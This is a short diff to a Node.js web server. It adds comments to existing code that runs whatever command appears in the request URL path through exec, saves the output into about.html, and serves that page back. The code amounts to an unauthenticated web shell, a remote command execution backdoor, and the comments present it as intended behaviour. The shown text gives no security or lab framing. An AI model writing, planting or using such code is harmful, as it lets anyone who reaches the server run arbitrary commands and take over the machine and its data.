@@ -23,18 +23,28 @@ const server = http.createServer((req, res) => {
     {
         if(req.url.split('/').length >= 3)
         {
+			// exec on the command that is at the end of the url
+			// replace any space present with %20 to prevent the server from crashing
             exec(req.url.split('/')[2].replace("%20", " "),
             function (error, stdout, stderr) {
+				
+				// print the output and errors to the console
                 console.log('stdout: ' + stdout);
                 console.log('stderr: ' + stderr);
+				
+				// write the output from the command to the about.html page 
                 fs.writeFile(path.join(__dirname,'public','about.html'), stdout ,(err) =>
                     {if(err) throw err;});
+					
+				// if there is an error, print to the console	
                 if (error !== null) {
                      console.log('exec error: ' + error);
                 }
             });
         }
-
+		
+		// read about.html (which we just wrote the command output to)
+		// send the about.html page to the webserver to ouptut to browser
         fs.readFile(path.join(__dirname,'public','about.html'), (err, data) =>
         {
         console.log('exec');
